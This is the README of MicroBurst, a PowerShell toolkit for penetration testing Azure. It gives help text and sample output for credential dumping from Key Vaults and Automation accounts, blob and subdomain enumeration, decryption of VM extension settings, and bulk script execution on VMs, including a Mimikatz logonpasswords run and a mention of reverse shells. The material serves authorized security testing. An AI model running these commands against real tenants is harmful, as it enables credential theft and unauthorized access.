![MicroBurstLogo](http://blog.netspi.com/wp-content/uploads/2020/03/Microburst_Github.png) 
<br> 
[![licence badge]][licence] 
[![stars badge]][stars] 
[![forks badge]][forks] 
[![issues badge]][issues]
![Twitter Follow](https://img.shields.io/twitter/follow/kfosaaen.svg?style=social)


[licence badge]:https://img.shields.io/badge/license-New%20BSD-blue.svg
[stars badge]:https://img.shields.io/github/stars/NetSPI/MicroBurst.svg
[forks badge]:https://img.shields.io/github/forks/NetSPI/MicroBurst.svg
[issues badge]:https://img.shields.io/github/issues/NetSPI/MicroBurst.svg


[licence]:https://github.com/NetSPI/MicroBurst/blob/master/LICENSE.txt
[stars]:https://github.com/NetSPI/MicroBurst/stargazers
[forks]:https://github.com/NetSPI/MicroBurst/network
[issues]:https://github.com/NetSPI/MicroBurst/issues


### MicroBurst: A PowerShell Toolkit for Attacking Azure

MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping. It is intended to be used during penetration tests where Azure is in use.

### Author, Contributors, and License
* Author: Karl Fosaaen (@kfosaaen), NetSPI
* Contributors: Scott Sutherland (@_nullbind), Thomas Elling (@thomaselling), Jake Karnes (jakekarnes42)
* License: BSD 3-Clause
* Required Dependencies: Az, Azure, AzureRM, AzureAD, and MSOnline PowerShell Modules are all used in different scripts
* Dependencies Note: Originally written with the AzureRM PS modules, older scripts have been ported to their newer Az equivalents

### Importing the Module
	Import-Module .\MicroBurst.psm1
This will import all applicable functions based off of the currently installed modules in your environment.

Recommended Modules to install:
* <a href="https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-3.6.1">Az</a>
* <a href="https://docs.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0">AzureAd</a>
* <a href="https://docs.microsoft.com/en-us/powershell/module/msonline/?view=azureadps-1.0">MSOnline</a>

### Related Blogs
* <a href="https://blog.netspi.com/enumerating-azure-services/">Anonymously Enumerating Azure Services</a>
* <a href="https://blog.netspi.com/anonymously-enumerating-azure-file-resources/">Anonymously Enumerating Azure File Resources</a>
* <a href="https://blog.netspi.com/get-azurepasswords/">Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions</a>
* <a href="https://blog.netspi.com/exporting-azure-runas-certificates/">Get-AzurePasswords: Exporting Azure RunAs Certificates for Persistence</a>
* <a href="https://blog.netspi.com/azure-automation-accounts-key-stores">Using Azure Automation Accounts to Access Key Vaults</a>
* <a href="https://blog.netspi.com/utiilzing-azure-for-red-team-engagements/">Utilizing Azure Services for Red Team Engagements</a>
* <a href="https://blog.netspi.com/running-powershell-scripts-on-azure-vms">Running PowerShell on Azure VMs at Scale</a>
* <a href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">Maintaining Azure Persistence via Automation Accounts</a>

### Presentations
* <a href="https://www.youtube.com/watch?v=EYtw-XPml0w">Adventures in Azure Privilege Escalation - DerbyCon 9</a>
  - <a href="https://notpayloads.blob.core.windows.net/slides/Azure-PrivEsc-DerbyCon9.pdf">DerbyCon 9 (2019) Slides</a>
* <a href="https://www.youtube.com/watch?v=IdORwgxDpkw">Attacking Azure Environments with PowerShell - DerbyCon 8</a>
  - <a href="https://www.slideshare.net/kfosaaen/derbycon-8-attacking-azure-environments-with-powershell">DerbyCon 8 (2018) Slides</a>
  - <a href="https://www.slideshare.net/kfosaaen/bsides-portland-attacking-azure-environments-with-powershell">BSidesPDX (2018) Slides</a>
	
### Functions Information
# Get-AzurePasswords.ps1
PS C:\> Get-Help Get-AzurePasswords

NAME: Get-AzurePasswords
    
SYNOPSIS: Dumps all available credentials from an Azure subscription. Pipe to Out-Gridview or Export-CSV for easier parsing.
        
SYNTAX: Get-AzurePasswords [[-Subscription] <String>] [[-ExportCerts] <String>] [<CommonParameters>]
        
DESCRIPTION: 
	This function will look for any available credentials and certificates store in Key Vaults, App Services Configurations, and Automation accounts. 
	If the Azure management account has permissions, it will read the values directly out of the Key Vaults and App Services Configs.
	A runbook will be spun up for dumping automation account credentials, so it will create a log entry in the automation jobs.
	
    -------------------------- EXAMPLE 1 --------------------------
    
	PS C:\MicroBurst> Get-AzurePasswords -Verbose | Out-GridView
	VERBOSE: Logged In as testaccount@example.com
	VERBOSE: Getting List of Key Vaults...
	VERBOSE: 	Exporting items from example-private
	VERBOSE: 	Exporting items from PasswordStore
	VERBOSE: 		Getting Key value for the example-Test Key
	VERBOSE: 		Getting Key value for the RSA-KEY-1 Key
	VERBOSE: 		Getting Key value for the TestCertificate Key
	VERBOSE: 		Getting Secret value for the example-Test Secret
	VERBOSE: 			Unable to export Secret value for example-Test
	VERBOSE: 		Getting Secret value for the SuperSecretPassword Secret
	VERBOSE: 		Getting Secret value for the TestCertificate Secret
	VERBOSE: Getting List of Azure App Services...
	VERBOSE: 	Profile available for example1
	VERBOSE: 	Profile available for example2
	VERBOSE: 	Profile available for example3
	VERBOSE: Getting List of Azure Automation Accounts...
	VERBOSE: 	Getting credentials for testAccount using the lGVeLPZARrTJdDu.ps1 Runbook
	VERBOSE: 		Waiting for the automation job to complete
	VERBOSE: Password Dumping Activities Have Completed

	
RELATED LINKS: https://blog.netspi.com/get-azurepasswords


# Invoke-EnumerateAzureBlobs.ps1
PS C:\> Import-Module .\Invoke-EnumerateAzureBlobs.ps1

PS C:\> Get-Help Invoke-EnumerateAzureBlobs

NAME: Invoke-EnumerateAzureBlobs
    
SYNOPSIS: PowerShell function for enumerating public Azure Blobs and Containers.
        
SYNTAX: Invoke-EnumerateAzureBlobs [[-Base] <String>] [[-OutputFile] <String>] [[-Permutations] <String>] [[-Folders] <String>] [[-BingAPIKey] <String>] [<CommonParameters>]
        
DESCRIPTION: 
	The function will check for valid .blob.core.windows.net host names via DNS. 
	If a BingAPIKey is supplied, a Bing search will be made for the base word under the .blob.core.windows.net site.
	After completing storage account enumeration, the function then checks for valid containers via the Azure REST API methods.
	If a valid container has public files, the function will list them out.
	
    -------------------------- EXAMPLE 1 --------------------------
    
    PS C:\>Invoke-EnumerateAzureBlobs -Base secure
    
    Found Storage Account -  secure.blob.core.windows.net
    Found Storage Account -  testsecure.blob.core.windows.net
    Found Storage Account -  securetest.blob.core.windows.net
    Found Storage Account -  securedata.blob.core.windows.net
    Found Storage Account -  securefiles.blob.core.windows.net
    Found Storage Account -  securefilestorage.blob.core.windows.net
    Found Storage Account -  securestorageaccount.blob.core.windows.net
    Found Storage Account -  securesql.blob.core.windows.net
    Found Storage Account -  hrsecure.blob.core.windows.net
    Found Storage Account -  secureit.blob.core.windows.net
    Found Storage Account -  secureimages.blob.core.windows.net
    Found Storage Account -  securestorage.blob.core.windows.net
    
    Found Container - hrsecure.blob.core.windows.net/NETSPItest
     Public File Available: https://hrsecure.blob.core.windows.net/NETSPItest/SuperSecretFile.txt
    Found Container - secureimages.blob.core.windows.net/NETSPItest123	
	
RELATED LINKS: https://blog.netspi.com/anonymously-enumerating-azure-file-resources/


# Invoke-EnumerateAzureSubDomains.ps1
PS C:\> Import-Module .\Invoke-EnumerateAzureSubDomains.ps1

PS C:\> Get-Help Invoke-EnumerateAzureSubDomains

NAME: Invoke-EnumerateAzureSubDomains

SYNOPSIS: PowerShell function for enumerating public Azure services.

SYNTAX: Invoke-EnumerateAzureSubDomains [-Base] <String> [[-Permutations] <String>] [<CommonParameters>]

DESCRIPTION: The function will check for valid Azure subdomains, based off of a base word, via DNS.

    -------------------------- EXAMPLE 1 --------------------------
    
    PS C:\>Invoke-EnumerateAzureSubDomains -Base test123 -Verbose
    
    Invoke-EnumerateAzureSubDomains -Base test12345678 -Verbose 
    VERBOSE: Found test12345678.cloudapp.net
    VERBOSE: Found test12345678.scm.azurewebsites.net
    VERBOSE: Found test12345678.onmicrosoft.com
    VERBOSE: Found test12345678.database.windows.net
    VERBOSE: Found test12345678.mail.protection.outlook.com
    VERBOSE: Found test12345678.queue.core.windows.net
    VERBOSE: Found test12345678.blob.core.windows.net
    VERBOSE: Found test12345678.file.core.windows.net
    VERBOSE: Found test12345678.vault.azure.net
    VERBOSE: Found test12345678.table.core.windows.net
    VERBOSE: Found test12345678.azurewebsites.net
    VERBOSE: Found test12345678.documents.azure.com
    VERBOSE: Found test12345678.azure-api.net
    VERBOSE: Found test12345678.sharepoint.com
    
    Subdomain                                Service                
    ---------                                -------                
    test12345678.azure-api.net               API Services           
    test12345678.cloudapp.net                App Services           
    test12345678.scm.azurewebsites.net       App Services           
    test12345678.azurewebsites.net           App Services           
    test12345678.documents.azure.com         Databases-Cosmos DB    
    test12345678.database.windows.net        Databases-MSSQL        
    test12345678.mail.protection.outlook.com Email                  
    test12345678.vault.azure.net             Key Vaults             
    test12345678.onmicrosoft.com             Microsoft Hosted Domain
    test12345678.sharepoint.com              SharePoint             
    test12345678.queue.core.windows.net      Storage Accounts       
    test12345678.blob.core.windows.net       Storage Accounts       
    test12345678.file.core.windows.net       Storage Accounts       
    test12345678.table.core.windows.net      Storage Accounts

RELATED LINKS: https://blog.netspi.com/enumerating-azure-services/

# Get-AzureDomainInfo.ps1
PS C:\> Import-Module .\Get-AzureDomainInfo.ps1

PS C:\> Get-Help Get-AzureDomainInfo

NAME: Get-AzureDomainInfo

SYNOPSIS: PowerShell function for dumping information from Azure subscriptions via authenticated ASM and ARM connections.

SYNTAX: Get-AzureDomainInfo [[-folder] <String>] [[-Subscription] <String>] [[-ResourceGroup] <String>] [[-Users] <String>] [[-Groups] <String>] [[-StorageAccounts] <String>] [[-Resources] <String>] [[-VMs] <String>] [[-NetworkInfo] <String>] [[-RBAC] <String>] [[-LoginBypass] <String>] [<CommonParameters>]

DESCRIPTION: The function will dump available information for an Azure domain out to CSV and txt files in the -folder parameter directory.

    -------------------------- EXAMPLE 1 --------------------------
    
    PS C:\>Get-AzureDomainInfo -folder MicroBurst -Verbose
    
    VERBOSE: Currently logged in via AzureRM as ktest@fosaaen.com
    VERBOSE: Dumping information for Selected Subscriptions...
    VERBOSE: Dumping information for the 'MicroBurst Demo' Subscription...
    VERBOSE: Getting Domain Users...
    VERBOSE: 	70 Domain Users were found.
    VERBOSE: Getting Domain Groups...
    VERBOSE: 	15 Domain Groups were found.
    VERBOSE: Getting Domain Users for each group...
    VERBOSE: 	Domain Group Users were enumerated for 15 group(s).
    VERBOSE: Getting Storage Accounts...
    VERBOSE: 	Listing out blob files for the icrourstesourcesdiag storage account...
    VERBOSE: 		Listing files for the bootdiagnostics-mbdemoser container
    VERBOSE: 	No available File Service files for the icrourstesourcesdiag storage account...
    VERBOSE: 	No available Data Tables for the icrourstesourcesdiag storage account...
    VERBOSE: 	Listing out blob files for the microburst storage account...
    VERBOSE: 		Listing files for the test container
    VERBOSE: 	No available File Service files for the microburst storage account...
    VERBOSE: 	No available Data Tables for the microburst storage account...
    VERBOSE: 	2 storage accounts were found.
    VERBOSE: 	2 Domain Authentication endpoints were enumerated.
    VERBOSE: Getting Domain Service Principals...
    VERBOSE: 	58 service principals were enumerated.
    VERBOSE: Getting Azure Resource Groups...
    VERBOSE: 	3 Resource Groups were enumerated.
    VERBOSE: Getting Azure Resources...
    VERBOSE: 	36 Resources were enumerated.
    VERBOSE: Getting AzureSQL Resources...
    VERBOSE: 	1 AzureSQL servers were enumerated.
    VERBOSE: 	2 AzureSQL databases were enumerated.
    VERBOSE: Getting Azure App Services...
    VERBOSE: 	2 App Services enumerated.
    VERBOSE: Getting Network Interfaces...
    VERBOSE: 	4 Network Interfaces Enumerated...
    VERBOSE: Getting Public IPs for each Network Interface...
    VERBOSE: Getting Network Security Groups...
    VERBOSE: 	3 Network Security Groups were enumerated.
    VERBOSE: 	6 Network Security Group Firewall Rules were enumerated.
    VERBOSE: 		3 Inbound 'Any Any' Network Security Group Firewall Rules were enumerated.
    VERBOSE: Getting RBAC Users and Roles...
    VERBOSE: 	2 Users with 'Owner' permissions were enumerated.
    VERBOSE: 	92 roles were enumerated.
    
    VERBOSE: Done with all tasks for the 'MicroBurst Demo' Subscription.


# Get-MSOLDomainInfo.ps1
PS C:\> Import-Module .\Get-MSOLDomainInfo.ps1

PS C:\> Get-Help Get-MSOLDomainInfo

NAME: Get-MSOLDomainInfo

SYNOPSIS: PowerShell function for dumping information from an Office365 domain via an authenticated MSOL connection.

SYNTAX: Get-MSOLDomainInfo [[-folder] <String>] [[-Users] <String>] [[-Groups] <String>] [<CommonParameters>]

DESCRIPTION: The function will dump available information for an Office365 domain out to CSV and txt files in the -folder parameter directory.
    
    -------------------------- EXAMPLE 1 --------------------------
    
    PS C:\>Get-AzureDomainInfo -folder Test -Verbose
    
    VERBOSE: Getting Domain Contact Info...
    VERBOSE: Getting Domains...
    VERBOSE: 4 Domains were found.
    VERBOSE: Getting Domain Users...
    VERBOSE: 200 Domain Users were found across 4 domains.
    VERBOSE: Getting Domain Groups...
    VERBOSE: 90 Domain Groups were found.
    VERBOSE: Getting Domain Users for each group...
    VERBOSE: Domain Group Users were enumerated for 90 groups.
    VERBOSE: Getting Domain Devices...
    VERBOSE: 22 devices were enumerated.
    VERBOSE: Getting Domain Service Principals...
    VERBOSE: 134 service principals were enumerated.
    VERBOSE: All done.
	
# Invoke-AzureRmVMBulkCMD.ps1
PS C:\> Import-Module .\Get-MSOLDomainInfo.ps1

PS C:\> Get-Help Invoke-AzureRmVMBulkCMD

NAME: Invoke-AzureRmVMBulkCMD

SYNOPSIS: Runs a Powershell script against all (or select) VMs in a subscription/resource group/etc.

SYNTAX: Invoke-AzureRmVMBulkCMD [[-Subscription] <String[]>] [[-ResourceGroupName] <String[]>] [[-Name] <String[]>] [-Script] <String> [[-output] <String>] [<CommonParameters>]

DESCRIPTION: This function will run a PowerShell script on all (or a list of) VMs in a subscription/resource group/etc. This can be handy for creating reverse shells, running Mimikatz, or doing practical automation of work.
    
    -------------------------- EXAMPLE 1 --------------------------
    
    PS C:\MicroBurst>Invoke-AzureRmVMBulkCMD -Verbose -Script .\Mimikatz.ps1
    
    Executing C:\MicroBurst\Mimikatz.ps1 against all (1) VMs in the Testing-Resources Subscription
    Are you Sure You Want To Proceed: (Y/n): 
    VERBOSE: Running .\Mimikatz.ps1 on the Remote-West - (10.2.0.5 : 40.112.160.13) virtual machine (1 of 1)
    VERBOSE: Script Status: Succeeded
    Script Output: 
      .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28)
     .## ^ ##.  
     ## / \ ##  /* * *
     ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
      '#####'                                     with 15 modules * * */
    
    
    mimikatz(powershell) # sekurlsa::logonpasswords
    [Truncated]
    mimikatz(powershell) # exit
    Bye!
    
    VERBOSE: Script Execution Completed on Remote-West - (10.2.0.5 : 40.112.160.13)
    VERBOSE: Script Execution Completed in 37 seconds

RELATED LINKS: https://blog.netspi.com/running-powershell-scripts-on-azure-vms

# Get-AzureKeyVaults-Automation.ps1
PS C:\> Import-Module .\Get-AzureKeyVaults-Automation.ps1

PS C:\> Get-Help Get-AzureKeyVaults-Automation

NAME: Get-AzureKeyVaults-Automation

SYNOPSIS: Dumps all available Key Vault Keys/Secrets from an Azure subscription via Automation Accounts. Pipe to Out-Gridview, ft -AutoSize, or Export-CSV for easier parsing.

SYNTAX: Get-AzureKeyVaults-Automation [[-Subscription] <String>] [[-CertificatePassword] <String>] [[-ExportCerts] <String>] [<CommonParameters>]

DESCRIPTION: This function will look for any Key Vault Keys/Secrets that are available to an Automation RunAs Account, or as a configured Automation credential. 
    If either account has Key Vault permissions, the runbook will read the values directly out of the Key Vaults.
    A runbook will be spun up, so it will create a log entry in the automation jobs.
    Per the statements above, and the fact that you may try to access keys that you may not have permissions for... This should not be considered as Opsec Safe.

    -------------------------- EXAMPLE 1 --------------------------
    PS C:\MicroBurst>Get-AzureKeyVaults-Automation -Verbose
    
    VERBOSE: Logged In as kfosaaen@notasubscription.onmicrosoft.com
    VERBOSE: Getting List of Azure Automation Accounts...
    VERBOSE: 	Automation Credential (testcred) found for kfosaaen Automation Account
    VERBOSE: 	Automation Credential (testCred2) found for kfosaaen Automation Account
    VERBOSE: 	Getting getting available Key Vault Keys/Secrets using the kfosaaen Automation Account, testcred Credential, and the FCIGmKqaTkEUViN.ps1 Runbook
    VERBOSE: 		Waiting for the automation job to complete
    VERBOSE: 		Removing FCIGmKqaTkEUViN runbook from kfosaaen Automation Account
    VERBOSE: 	Getting getting available Key Vault Keys/Secrets using the kfosaaen Automation Account, testCred2 Credential, and the HzROkCvceonUNdh.ps1 Runbook
    VERBOSE: 		Waiting for the automation job to complete
    VERBOSE: 		Removing HzROkCvceonUNdh runbook from kfosaaen Automation Account
    VERBOSE: Automation Key Vault Dumping Activities Have Completed

RELATED LINKS: https://blog.netspi.com/azure-automation-accounts-key-stores

# Get-AzureVMExtensionSettings.ps1
PS C:\> Import-Module .\Get-AzureVMExtensionSettings.ps1

PS C:\> Get-Help Get-AzureVMExtensionSettings -full

NAME
    Get-AzureVMExtensionSettings

SYNOPSIS
    PowerShell function for dumping information from Azure VM Extension Settings


SYNTAX
    Get-AzureVMExtensionSettings [<CommonParameters>]


DESCRIPTION
    The function will read all available extension settings, decrypt protected values (if the required certificate can be
    found) and return all the settings.


PARAMETERS
    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).

INPUTS

OUTPUTS

    -------------------------- EXAMPLE 1 --------------------------

	PS C:\> Get-AzureVMExtensionSettings

	FileName                        : C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\RuntimeSettings\0.settings
	ExtensionName                   : Microsoft.Azure.Security.IaaSAntimalware
	ProtectedSettingsCertThumbprint : 
	ProtectedSettings               : 
	ProtectedSettingsDecrypted      : 
	PublicSettings                  : {"AntimalwareEnabled":true,"RealtimeProtectionEnabled":"false","ScheduledScanSettings":{...},"Exclusions":{...}}

	FileName                        : C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\RuntimeSettings\0.settings
	ExtensionName                   : Microsoft.Compute.CustomScriptExtension
	ProtectedSettingsCertThumbprint : 23B8893CD7...
	ProtectedSettings               : MIIB8AYJKoZIhvcNAQc...UNMih8=
	ProtectedSettingsDecrypted      : {"fileUris":["http://.../netspi/launcher.ps1"]}
	PublicSettings                  : {"commandToExecute":"powershell -ExecutionPolicy Unrestricted -file launcher.ps1 "}

	FileName                        : C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\RuntimeSettings\1.settings
	ExtensionName                   : Microsoft.CPlat.Core.RunCommandWindows
	ProtectedSettingsCertThumbprint : C85DD4C5E9...
	ProtectedSettings               : MIIBsAYJKoZI...B+E0ZomM6gAghguFCQ28f2w==
	ProtectedSettingsDecrypted      : 
	PublicSettings                  : {"script":["whoami"]}
	
	FileName                        : C:\WindowsAzure\CollectGuestLogsTemp\5e3cfc7e-c8b2-4fce-96f0-6c1b2c2bc87d.zip\Config\WireServerRoleExtensionsConfig_f26eeb35-229d-4f5e-9877-f8666a1680e9._MGITest.xml
	ExtensionName                   : Microsoft.Compute.VMAccessAgent
	ProtectedSettingsCertThumbprint : 20304BDF13...
	ProtectedSettings               : MIIB0AYJKoZI...GkBIzEtqohr/WJd5KSCK
	ProtectedSettingsDecrypted      : {"Password":"[REDACTED]"}
	PublicSettings                  : {"UserName":"[REDACTED]"}
